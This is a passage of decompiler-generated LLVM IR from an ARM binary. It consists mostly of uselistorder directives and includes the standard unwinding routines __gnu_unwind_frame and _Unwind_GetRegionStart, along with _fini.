97, 98, 349, 350, 112, 113, 413, 414, 99, 100, 101, 102, 103, 104, 21, 105, 106, 107, 34, 35, 36, 415, 416, 426, 427, 329, 330, 331, 332, 333, 381, 382, 383, 384, 385, 417, 418, 419, 420, 421, 338, 339, 340, 341, 342, 108, 109, 110, 111, 83, 84, 22, 66, 67, 68, 69, 23, 37, 38, 70, 71, 7, 72, 32, 73, 74, 351, 352, 357, 358, 359, 360, 361, 362, 363, 353, 354, 355, 356, 364, 365, 366, 367, 368, 369, 370, 371, 24, 372, 373, 374, 239, 240, 93, 94, 95, 96, 375, 378, 379, 380, 376, 377, 319, 322, 323, 324, 320, 321, 33, 81, 82, 233, 236, 237, 238, 234, 235, 316, 25, 317, 318, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 308, 309, 39, 40, 304, 305, 306, 307, 26, 310, 311, 312, 2, 27, 28, 313, 314, 315, 334, 335, 336, 337, 75, 76, 325, 326, 327, 328, 343, 344, 85, 86, 217, 29, 218, 219, 345, 346, 347, 348, 77, 78, 79, 80, 422, 30, 423, 424, 425, 87, 88, 89, 90, 91, 92, 41 }
  uselistorder i32* @lr, { 5, 0, 171, 172, 173, 174, 182, 175, 176, 177, 178, 3, 179, 180, 181, 183, 184, 185, 186, 44, 45, 46, 47, 48, 13, 14, 15, 16, 17, 49, 1, 50, 2, 51, 52, 53, 55, 56, 60, 61, 62, 66, 67, 68, 69, 70, 71, 72, 73, 77, 88, 89, 81, 90, 91, 92, 93, 94, 95, 96, 18, 97, 98, 99, 107, 100, 101, 102, 103, 104, 105, 106, 108, 187, 188, 190, 191, 19, 20, 78, 79, 80, 63, 64, 65, 109, 110, 113, 24, 192, 193, 194, 195, 196, 197, 198, 199, 200, 82, 83, 84, 85, 86, 87, 57, 58, 59, 114, 115, 116, 117, 118, 119, 120, 74, 75, 76, 121, 122, 54, 21, 22, 201, 202, 33, 34, 35, 36, 37, 12, 203, 204, 205, 210, 139, 140, 169, 170, 208, 209, 143, 144, 38, 39, 40, 23, 145, 146, 147, 148, 149, 41, 42, 43, 206, 207, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 4, 162, 163, 165, 166, 164, 25, 26, 167, 168, 134, 135, 8, 111, 112, 123, 124, 125, 126, 127, 128, 6, 7, 129, 130, 131, 132, 133, 27, 141, 142, 138, 136, 137, 189, 28, 29, 30, 31, 32, 9, 10, 11 }
  uselistorder i32* @r6, { 368, 369, 370, 381, 371, 31, 372, 4, 373, 374, 5, 375, 376, 377, 378, 379, 380, 382, 1, 383, 384, 126, 127, 128, 129, 130, 131, 6, 132, 133, 134, 135, 153, 154, 155, 156, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 194, 195, 196, 197, 198, 199, 200, 212, 213, 214, 237, 238, 243, 244, 8, 7, 47, 48, 49, 50, 51, 52, 245, 246, 9, 247, 248, 249, 250, 251, 252, 253, 385, 386, 10, 387, 388, 389, 390, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 157, 158, 159, 160, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 136, 11, 137, 138, 215, 221, 222, 28, 223, 216, 217, 12, 218, 219, 220, 224, 225, 226, 227, 228, 139, 140, 141, 142, 266, 267, 268, 269, 13, 270, 271, 272, 278, 279, 280, 281, 229, 230, 233, 234, 14, 235, 236, 275, 276, 273, 274, 277, 189, 15, 190, 191, 192, 193, 143, 32, 144, 29, 16, 17, 145, 146, 147, 148, 149, 150, 151, 152, 53, 54, 55, 56, 57, 58, 59, 60, 92, 93, 94, 95, 19, 96, 97, 98, 99, 100, 101, 102, 18, 103, 104, 105, 106, 20, 107, 108, 109, 110, 111, 112, 113, 114, 115, 37, 38, 39, 40, 41, 394, 116, 21, 117, 118, 22, 61, 62, 63, 64, 65, 42, 23, 43, 24, 44, 391, 392, 393, 66, 67, 68, 119, 120, 121, 122, 69, 70, 71, 72, 73, 74, 33, 332, 336, 337, 338, 339, 333, 334, 335, 340, 341, 342, 343, 344, 25, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 360, 362, 356, 357, 358, 359, 361, 363, 77, 78, 3, 79, 34, 86, 87, 364, 365, 366, 367, 320, 321, 322, 323, 239, 240, 241, 242, 35, 36, 315, 316, 317, 318, 319, 231, 232, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 26, 30, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 2, 310, 311, 27, 45, 295, 0, 296, 297, 312, 313, 314, 75, 76, 88, 89, 90, 91, 328, 329, 330, 331, 324, 325, 326, 327, 80, 81, 82, 83, 84, 85, 123, 124, 125, 46 }
  uselistorder label %dec_label_pc_31ed0, { 1, 0 }
  uselistorder label %dec_label_pc_31e6c, { 1, 0 }
  uselistorder label %dec_label_pc_31e18, { 1, 0 }
  uselistorder label %dec_label_pc_31df0, { 1, 0 }
  uselistorder label %dec_label_pc_31d5c, { 1, 0 }
  uselistorder label %dec_label_pc_31d40, { 1, 0 }
  uselistorder label %dec_label_pc_31d24, { 1, 0 }
  uselistorder label %dec_label_pc_31cd4, { 1, 0 }
  uselistorder label %dec_label_pc_31cb8, { 1, 0 }
  uselistorder label %dec_label_pc_31c34, { 1, 0 }
  uselistorder label %dec_label_pc_31c18, { 1, 0 }
  uselistorder label %dec_label_pc_31b54, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_31b24, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_31b0c, { 1, 0 }
  uselistorder label %dec_label_pc_31af0, { 1, 0 }
  uselistorder label %dec_label_pc_31854.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_3197c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_31970, { 0, 2, 1 }
  uselistorder label %dec_label_pc_31964, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_31914, { 1, 0 }
  uselistorder label %dec_label_pc_31904, { 1, 0 }
  uselistorder label %dec_label_pc_31890, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_31f58 = add i32 %ucbp, 76
  %v2_31f58 = inttoptr i32 %v1_31f58 to i32*
  %v3_31f58 = load i32, i32* %v2_31f58, align 4
  %v1_31f5c = add i32 %v3_31f58, 4
  %v2_31f5c = inttoptr i32 %v1_31f5c to i32*
  %v3_31f5c = load i32, i32* %v2_31f5c, align 4
  %v3_31f64 = mul i32 %v3_31f5c, 256
  %v4_31f6c = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_31f64, i32* %v4_31f6c, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_31f8c = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_31f8c

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 113, 101, 29, 30, 31, 32, 102, 107, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 100, 105, 71, 72, 73, 108, 74, 109, 110, 75, 111, 76, 106, 112, 77, 78, 80, 79, 81, 82, 83, 84, 0, 103, 1, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 99, 104, 98, 95, 96, 97 }
  uselistorder i32 4, { 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 115, 448, 449, 450, 451, 452, 5, 455, 456, 453, 454, 457, 6, 458, 459, 460, 461, 7, 478, 8, 462, 463, 464, 465, 466, 9, 467, 10, 468, 469, 470, 471, 472, 473, 474, 11, 475, 139, 476, 477, 479, 480, 481, 482, 12, 483, 13, 14, 15, 203, 262, 263, 204, 16, 17, 264, 265, 266, 267, 140, 268, 269, 277, 279, 280, 116, 281, 282, 283, 93, 284, 287, 141, 288, 289, 290, 291, 292, 293, 18, 294, 142, 117, 295, 143, 0, 1, 144, 300, 333, 334, 118, 119, 335, 145, 146, 147, 336, 337, 121, 338, 120, 339, 243, 19, 20, 95, 340, 341, 342, 313, 314, 217, 218, 285, 286, 212, 213, 214, 484, 215, 216, 301, 302, 303, 304, 305, 306, 307, 308, 309, 21, 310, 311, 312, 278, 22, 343, 23, 344, 382, 270, 24, 25, 26, 345, 27, 114, 109, 110, 28, 488, 111, 489, 98, 29, 30, 112, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 31, 507, 508, 509, 510, 511, 512, 97, 513, 514, 515, 516, 517, 518, 32, 33, 113, 519, 322, 122, 320, 321, 315, 316, 317, 318, 319, 346, 347, 348, 349, 350, 351, 352, 353, 354, 94, 355, 356, 357, 358, 361, 323, 324, 325, 326, 327, 329, 34, 330, 123, 331, 332, 359, 360, 296, 297, 298, 299, 362, 148, 271, 272, 273, 274, 275, 276, 35, 219, 220, 221, 222, 36, 223, 520, 247, 209, 149, 124, 150, 522, 37, 523, 151, 210, 211, 521, 103, 224, 225, 258, 259, 260, 261, 152, 385, 386, 387, 104, 388, 153, 154, 229, 155, 156, 230, 38, 231, 232, 96, 39, 226, 157, 227, 158, 99, 228, 248, 159, 249, 250, 253, 254, 255, 256, 100, 391, 392, 393, 394, 395, 396, 160, 161, 40, 397, 398, 399, 400, 401, 402, 403, 404, 162, 389, 390, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 163, 164, 165, 419, 420, 423, 426, 421, 422, 125, 166, 424, 80, 425, 427, 428, 429, 431, 167, 42, 41, 430, 168, 169, 170, 383, 43, 44, 45, 46, 47, 171, 381, 172, 328, 363, 48, 49, 50, 51, 2, 487, 52, 53, 173, 81, 54, 55, 174, 56, 175, 176, 177, 178, 364, 365, 57, 366, 179, 367, 368, 369, 127, 370, 371, 126, 180, 372, 373, 374, 375, 376, 377, 82, 181, 378, 380, 182, 183, 379, 205, 233, 234, 235, 236, 101, 485, 486, 206, 58, 59, 83, 84, 85, 60, 61, 62, 86, 63, 64, 184, 65, 237, 238, 128, 239, 240, 241, 242, 244, 105, 245, 106, 246, 107, 108, 87, 66, 129, 185, 186, 187, 188, 189, 190, 191, 192, 132, 130, 207, 133, 67, 193, 131, 68, 208, 138, 69, 70, 102, 71, 72, 88, 194, 251, 252, 257, 195, 89, 90, 73, 74, 75, 135, 134, 136, 91, 196, 137, 197, 92, 198, 199, 76, 384, 77, 78, 79, 432, 433, 434, 435, 436, 437, 200, 201, 202, 3, 4 }
  uselistorder i32 76, { 16, 17, 18, 19, 20, 21, 0, 2, 3, 4, 1, 5, 6, 8, 9, 7, 10, 12, 13, 14, 15, 11 }
  uselistorder i32 1, { 841, 1642, 1643, 708, 1647, 1648, 1649, 1650, 738, 1651, 1652, 655, 682, 739, 1644, 1645, 1646, 1653, 709, 1654, 842, 31, 36, 34, 32, 37, 33, 35, 843, 844, 845, 846, 740, 741, 1655, 1656, 639, 849, 848, 847, 249, 251, 250, 252, 254, 253, 852, 851, 850, 54, 742, 743, 361, 1657, 244, 1658, 855, 854, 853, 181, 1659, 1660, 1661, 1662, 857, 856, 122, 124, 125, 123, 126, 713, 728, 858, 729, 714, 1305, 1211, 1306, 859, 382, 387, 386, 384, 383, 385, 389, 388, 1307, 860, 1308, 861, 148, 150, 146, 147, 149, 462, 119, 118, 683, 248, 862, 466, 467, 1309, 1310, 73, 72, 1311, 565, 566, 567, 863, 366, 367, 362, 363, 364, 365, 1312, 632, 1313, 1314, 744, 1315, 1316, 864, 18, 19, 20, 17, 23, 21, 22, 1317, 1318, 1319, 745, 746, 1320, 1321, 1338, 867, 866, 865, 470, 471, 468, 469, 1340, 868, 24, 25, 1341, 684, 1342, 1343, 869, 324, 1344, 870, 270, 120, 121, 871, 371, 370, 128, 127, 872, 873, 472, 1345, 875, 874, 400, 399, 398, 650, 876, 473, 747, 1346, 1347, 1348, 748, 1349, 721, 1350, 1351, 656, 1352, 1353, 879, 878, 877, 475, 474, 476, 477, 880, 480, 479, 478, 1354, 1355, 1356, 1371, 1372, 1373, 1380, 749, 750, 889, 888, 887, 886, 837, 885, 884, 883, 882, 881, 482, 485, 483, 484, 486, 481, 1383, 890, 15, 12, 14, 16, 13, 715, 1423, 1424, 706, 1425, 1426, 1428, 633, 1429, 1430, 751, 701, 700, 753, 1431, 647, 665, 754, 755, 756, 1432, 1433, 1434, 1435, 1436, 1437, 0, 1427, 752, 1438, 710, 896, 828, 895, 894, 893, 892, 891, 352, 350, 353, 351, 1439, 1440, 1441, 1442, 1443, 634, 1444, 897, 449, 452, 448, 446, 445, 447, 450, 451, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 685, 1220, 1221, 901, 900, 899, 898, 372, 373, 374, 375, 1222, 1223, 1224, 1225, 1226, 904, 903, 902, 261, 256, 259, 263, 258, 257, 260, 255, 264, 262, 686, 1445, 687, 1446, 1447, 1448, 1449, 1, 1450, 1451, 1452, 1453, 1454, 1455, 906, 905, 272, 271, 274, 275, 276, 277, 273, 730, 1456, 1457, 1458, 1459, 1460, 907, 379, 378, 380, 381, 377, 666, 1256, 1384, 908, 487, 488, 489, 909, 46, 910, 318, 319, 320, 321, 911, 70, 1461, 1462, 1463, 1464, 1191, 912, 498, 493, 494, 491, 490, 495, 496, 492, 497, 913, 283, 280, 281, 279, 282, 914, 290, 289, 286, 287, 288, 284, 285, 915, 183, 184, 191, 192, 187, 188, 189, 190, 185, 186, 916, 243, 242, 499, 917, 716, 1227, 110, 111, 109, 441, 440, 1663, 688, 757, 1664, 3, 2, 918, 300, 295, 293, 294, 301, 298, 299, 296, 297, 292, 758, 460, 919, 501, 502, 500, 1374, 759, 1375, 1376, 1377, 1378, 1379, 920, 194, 195, 193, 196, 455, 454, 689, 1465, 1466, 1485, 1486, 923, 922, 921, 107, 105, 106, 108, 657, 707, 658, 1572, 1573, 1574, 1575, 690, 924, 197, 1257, 1258, 103, 104, 1259, 925, 504, 505, 506, 503, 1322, 1323, 1324, 1666, 1326, 1325, 642, 926, 667, 1327, 1487, 668, 1488, 1668, 669, 1669, 1670, 1671, 1672, 1673, 1674, 1192, 1675, 1676, 1677, 1678, 1679, 1680, 1193, 829, 928, 927, 151, 155, 157, 153, 152, 154, 156, 158, 160, 159, 1406, 1385, 1404, 1405, 702, 670, 161, 162, 163, 164, 760, 1386, 1387, 1402, 1403, 929, 830, 165, 166, 1394, 1194, 1395, 1396, 1195, 1397, 1398, 1399, 1400, 1401, 176, 168, 169, 171, 174, 172, 170, 175, 167, 173, 1388, 1389, 1390, 761, 1391, 1392, 1393, 930, 512, 510, 513, 507, 515, 508, 511, 514, 509, 1407, 1408, 1409, 931, 97, 96, 92, 91, 90, 95, 93, 94, 98, 1328, 1329, 1330, 1331, 1332, 932, 344, 346, 343, 347, 348, 345, 349, 671, 691, 1489, 1490, 1491, 762, 1492, 653, 692, 648, 672, 1493, 763, 1494, 1495, 1496, 4, 1497, 640, 1498, 635, 1499, 764, 1500, 1501, 1502, 693, 1503, 945, 944, 943, 942, 941, 940, 939, 938, 937, 936, 935, 934, 831, 933, 199, 208, 198, 200, 212, 203, 201, 204, 202, 209, 210, 206, 205, 207, 211, 1504, 1505, 331, 329, 334, 336, 332, 333, 330, 335, 267, 649, 946, 268, 269, 947, 356, 1410, 1411, 1412, 1413, 1414, 1415, 1417, 1418, 1419, 1420, 1421, 1422, 673, 948, 517, 516, 518, 520, 521, 519, 523, 522, 1506, 1507, 1508, 178, 177, 179, 180, 949, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 950, 624, 630, 628, 626, 627, 631, 625, 629, 1509, 952, 951, 47, 50, 49, 48, 51, 53, 52, 694, 722, 955, 954, 953, 765, 1339, 956, 406, 1333, 1334, 1335, 1336, 1337, 766, 957, 337, 338, 339, 341, 340, 767, 342, 1228, 958, 328, 327, 768, 1229, 959, 359, 360, 769, 960, 102, 100, 101, 1230, 392, 391, 390, 961, 247, 245, 246, 962, 524, 963, 182, 964, 323, 322, 354, 965, 266, 265, 966, 355, 967, 968, 29, 30, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 770, 1276, 973, 972, 971, 970, 969, 527, 525, 526, 528, 530, 529, 532, 531, 1206, 1207, 974, 401, 402, 403, 404, 405, 1681, 1682, 1683, 1684, 771, 1685, 1686, 772, 1687, 977, 976, 975, 430, 432, 438, 431, 436, 435, 439, 437, 433, 434, 978, 112, 773, 979, 533, 534, 535, 393, 980, 542, 540, 541, 539, 536, 537, 538, 981, 40, 41, 39, 42, 38, 982, 984, 983, 394, 986, 985, 99, 987, 376, 1277, 990, 989, 988, 129, 130, 991, 114, 116, 115, 117, 674, 992, 543, 1231, 774, 775, 1232, 1233, 1234, 303, 304, 302, 308, 306, 305, 307, 309, 993, 218, 221, 219, 220, 217, 216, 214, 215, 636, 643, 1510, 994, 226, 223, 224, 225, 227, 222, 1296, 1297, 1298, 1299, 1300, 1301, 995, 601, 600, 609, 608, 602, 610, 605, 606, 603, 604, 611, 607, 612, 613, 311, 651, 1208, 1209, 1210, 996, 1586, 1587, 999, 998, 997, 312, 313, 1000, 659, 1366, 660, 1367, 1368, 652, 1369, 615, 621, 614, 617, 620, 619, 618, 622, 616, 1370, 1001, 59, 57, 63, 58, 62, 61, 64, 60, 661, 1235, 409, 408, 407, 410, 1278, 695, 1279, 1003, 1002, 414, 412, 411, 418, 416, 417, 415, 413, 1004, 423, 425, 421, 419, 420, 422, 424, 1005, 1006, 1688, 696, 776, 1008, 1007, 1009, 1590, 1593, 1594, 1595, 1010, 544, 549, 550, 548, 547, 551, 545, 546, 1596, 1597, 1598, 1599, 1011, 556, 562, 555, 561, 560, 554, 564, 563, 558, 552, 557, 553, 559, 1591, 1592, 777, 134, 133, 1600, 1601, 1602, 1603, 1604, 1605, 717, 1606, 1607, 1608, 1609, 1610, 1611, 1612, 1613, 779, 1614, 1615, 1616, 1617, 1618, 778, 1619, 1620, 1621, 1622, 1623, 1012, 230, 232, 228, 231, 236, 238, 235, 237, 239, 233, 234, 229, 241, 240, 780, 781, 654, 1016, 1015, 1014, 1013, 397, 426, 675, 453, 1017, 213, 1018, 278, 1019, 310, 1020, 568, 1021, 1022, 569, 1023, 1024, 570, 1025, 457, 456, 1026, 443, 442, 1027, 1028, 571, 1029, 1550, 1551, 572, 357, 1031, 1030, 573, 574, 1416, 1032, 1282, 1283, 5, 358, 1511, 1512, 1033, 575, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 429, 676, 1513, 1467, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1034, 67, 65, 66, 68, 69, 1568, 1569, 325, 326, 677, 1667, 1382, 1381, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1689, 74, 75, 76, 77, 782, 1035, 711, 1514, 1515, 784, 1516, 1517, 1518, 1519, 1520, 785, 1521, 1522, 1523, 1524, 1525, 786, 1527, 698, 697, 1526, 783, 1528, 1529, 787, 1530, 1531, 1532, 1040, 832, 1039, 1038, 1037, 1036, 81, 79, 80, 84, 88, 78, 85, 86, 82, 87, 83, 1533, 1041, 577, 580, 579, 581, 576, 578, 678, 1042, 396, 395, 1534, 1535, 1536, 135, 137, 136, 138, 712, 641, 1538, 1539, 662, 1540, 1541, 6, 7, 1542, 1544, 644, 1545, 789, 1546, 663, 1543, 788, 1052, 1051, 1050, 1049, 1048, 1047, 1046, 1045, 1044, 1043, 139, 140, 141, 790, 679, 1053, 142, 143, 144, 1537, 723, 833, 1547, 1548, 1549, 1054, 582, 584, 583, 587, 585, 586, 588, 1055, 589, 1237, 791, 1236, 703, 1058, 1057, 1056, 591, 594, 590, 592, 599, 593, 598, 597, 595, 596, 792, 1238, 1059, 1060, 1061, 1062, 1063, 1064, 463, 1065, 89, 1066, 45, 1067, 369, 368, 1068, 461, 1070, 1069, 27, 28, 1071, 26, 1072, 1073, 56, 55, 1074, 113, 1075, 317, 316, 43, 44, 1076, 428, 427, 291, 637, 1665, 459, 458, 1239, 645, 664, 1240, 1241, 1242, 638, 795, 1243, 1244, 1245, 718, 1246, 1247, 1248, 1249, 793, 794, 719, 796, 1082, 1081, 1080, 1079, 1078, 1077, 1250, 1251, 1089, 1088, 1087, 1086, 1085, 834, 1084, 1083, 797, 1252, 1253, 1091, 1090, 1254, 1255, 798, 1092, 1260, 1261, 799, 1098, 1097, 1096, 1095, 1094, 1093, 315, 1262, 800, 1263, 1264, 1265, 1104, 1103, 1102, 1101, 1100, 1099, 314, 1266, 1109, 1108, 1107, 1106, 1105, 1267, 801, 1114, 1113, 1112, 1111, 1110, 802, 803, 804, 1118, 1117, 1116, 1115, 1123, 839, 1122, 838, 1121, 1120, 1119, 1280, 805, 1203, 1204, 807, 1205, 806, 1190, 1281, 1132, 1131, 1130, 1129, 1128, 1127, 1126, 1125, 1124, 464, 465, 731, 1284, 1285, 1286, 808, 1287, 1135, 1134, 1133, 1137, 1136, 1138, 732, 1288, 1139, 1142, 1141, 1140, 8, 809, 704, 1289, 1144, 1143, 724, 1290, 810, 811, 1292, 1291, 812, 1147, 1146, 1145, 733, 1293, 1294, 813, 814, 815, 1295, 835, 1302, 816, 1148, 725, 817, 818, 1303, 819, 1304, 1156, 1155, 1154, 1153, 1152, 1151, 1150, 1149, 726, 727, 1157, 699, 1552, 1553, 1554, 820, 646, 1555, 1556, 1557, 821, 1558, 1161, 1160, 1159, 1158, 836, 1559, 71, 1560, 1162, 822, 1570, 1165, 1164, 1163, 1571, 145, 735, 1576, 1577, 734, 1578, 1579, 736, 737, 1580, 1581, 1166, 1582, 9, 10, 1585, 1583, 1584, 823, 1169, 1168, 1167, 824, 1588, 1589, 1171, 1170, 1174, 1173, 1172, 1177, 1176, 1175, 1179, 1178, 1624, 1625, 825, 1635, 1636, 705, 1637, 1181, 1180, 720, 11, 1185, 1184, 1183, 1182, 681, 1626, 1627, 1628, 680, 1629, 1633, 1634, 826, 1186, 827, 1630, 1631, 1632, 1187, 131, 1638, 1639, 132, 1640, 1641, 444, 1188, 1189, 623, 840 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_31fb8 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_31fc0 = add i32 %tmp1, 72
  %v2_31fc0 = inttoptr i32 %v1_31fc0 to i32*
  %v3_31fc0 = load i32, i32* %v2_31fc0, align 4
  ret i32 %v3_31fc0

; uselistorder directives
  uselistorder i32 72, { 36, 37, 0, 38, 31, 32, 28, 29, 1, 2, 4, 8, 5, 9, 6, 10, 7, 11, 35, 19, 20, 18, 21, 22, 23, 24, 25, 26, 13, 14, 15, 16, 12, 17, 3, 27, 33, 34, 30 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 12, 11, 14, 13, 143, 144, 145, 146, 63, 64, 65, 72, 10, 73, 75, 5, 7, 8, 76, 77, 2, 0, 1, 87, 34, 16, 37, 17, 74, 35, 36, 147, 78, 79, 80, 81, 82, 18, 83, 71, 19, 88, 89, 15, 148, 149, 150, 151, 152, 154, 155, 153, 156, 157, 158, 159, 160, 161, 162, 20, 21, 22, 23, 25, 24, 26, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 84, 85, 27, 28, 29, 66, 67, 68, 69, 70, 38, 39, 30, 40, 41, 42, 163, 9, 4, 43, 45, 46, 44, 56, 61, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 3, 31, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 139, 132, 133, 134, 135, 136, 137, 138, 140, 141, 32, 142, 86, 6, 103, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 58, 59, 60, 62, 33 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_31fd4 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_31fd4)
  %v31_31fdc = load i32, i32* @r0, align 4
  ret i32 %v31_31fdc

; uselistorder directives
  uselistorder i32* @r0, {}
  uselistorder void (i32)* @__pseudo_branch, { 17, 112, 105, 106, 107, 108, 109, 110, 111, 113, 114, 115, 84, 85, 86, 87, 88, 65, 66, 67, 56, 57, 58, 116, 72, 73, 74, 75, 76, 77, 68, 69, 70, 71, 78, 79, 54, 55, 89, 80, 81, 82, 83, 59, 60, 61, 62, 63, 64, 18, 19, 20, 21, 22, 23, 117, 34, 35, 36, 37, 38, 39, 1, 2, 122, 123, 124, 125, 126, 127, 128, 118, 132, 133, 134, 135, 40, 41, 24, 25, 26, 90, 91, 48, 49, 50, 51, 52, 53, 96, 97, 119, 120, 121, 0, 42, 43, 44, 27, 28, 29, 30, 31, 32, 45, 46, 47, 129, 130, 131, 98, 99, 100, 101, 102, 103, 136, 92, 93, 94, 95, 33, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 104 }
  uselistorder i32 0, { 491, 490, 574, 575, 2121, 495, 494, 576, 2122, 2123, 2124, 2125, 417, 416, 577, 2126, 2127, 281, 2128, 2130, 2131, 192, 193, 2132, 2133, 2129, 115, 116, 117, 118, 2, 1, 3, 0, 270, 269, 271, 272, 273, 2134, 492, 493, 181, 170, 2135, 2136, 275, 276, 274, 277, 2137, 2138, 2139, 2140, 280, 279, 278, 2141, 2142, 2143, 479, 478, 578, 496, 579, 497, 580, 498, 581, 582, 583, 194, 2144, 512, 511, 2145, 2146, 510, 509, 2147, 584, 507, 508, 505, 506, 504, 503, 2148, 502, 501, 500, 499, 422, 2149, 2165, 2150, 284, 2151, 2152, 2153, 2154, 2155, 2156, 286, 2158, 2159, 282, 283, 2160, 2161, 165, 195, 2162, 2163, 1089, 119, 120, 480, 481, 285, 2157, 2164, 421, 2166, 585, 586, 2167, 514, 513, 287, 2168, 2169, 288, 2170, 2171, 2172, 142, 587, 588, 2173, 289, 2174, 2175, 2176, 290, 2177, 2178, 2179, 2180, 2181, 2182, 2183, 2184, 2185, 2186, 38, 166, 589, 2187, 291, 2188, 2189, 2190, 4, 2191, 2192, 5, 2193, 2194, 6, 1420, 7, 1421, 1422, 1090, 562, 563, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 9, 10, 11, 1430, 1431, 8, 1432, 1433, 1091, 12, 1434, 1435, 39, 1092, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 136, 135, 292, 293, 294, 1444, 1445, 1446, 13, 1447, 1448, 40, 1449, 1450, 1451, 41, 42, 261, 1452, 1453, 1454, 1455, 43, 262, 590, 1456, 1457, 1458, 1459, 1460, 1461, 44, 1462, 15, 14, 45, 1093, 1463, 1095, 1094, 1464, 1465, 1466, 1467, 1468, 16, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1096, 1194, 1469, 1470, 1471, 1472, 1473, 17, 1474, 1097, 1475, 1476, 1477, 1478, 263, 264, 591, 1479, 1480, 19, 18, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1098, 1099, 1488, 1101, 1489, 1490, 1102, 1103, 1491, 1492, 1100, 1493, 1104, 1494, 1105, 1495, 1496, 1497, 1498, 20, 1499, 1500, 1501, 1502, 182, 1503, 295, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 296, 1106, 1109, 1107, 1108, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 59, 60, 1527, 1528, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1529, 297, 1536, 1531, 1532, 1533, 1534, 299, 1535, 298, 1563, 300, 1570, 1571, 1572, 171, 1573, 172, 1574, 173, 1575, 174, 1576, 301, 1577, 1578, 1579, 1580, 1581, 1583, 1584, 1586, 1585, 302, 1587, 21, 183, 2195, 592, 2196, 1588, 303, 1589, 1590, 305, 306, 143, 144, 1591, 304, 1592, 1593, 1594, 1595, 196, 197, 1596, 1597, 1598, 307, 1599, 1600, 482, 1601, 1602, 593, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 121, 1610, 1611, 145, 1639, 1640, 1641, 1642, 1643, 1644, 423, 1645, 1646, 1647, 1657, 1648, 1714, 1743, 1744, 1745, 1656, 198, 199, 1746, 515, 472, 473, 594, 1747, 1748, 1749, 1751, 1752, 1753, 1754, 46, 1755, 1756, 61, 424, 483, 1757, 1758, 1759, 1760, 1763, 1764, 1765, 1768, 1770, 1771, 308, 1772, 1110, 1773, 1761, 1750, 1111, 418, 1112, 1762, 1774, 1775, 1776, 62, 1778, 63, 1777, 200, 1779, 1780, 309, 1195, 1196, 1197, 1198, 1199, 146, 1200, 1201, 310, 1202, 47, 311, 1203, 595, 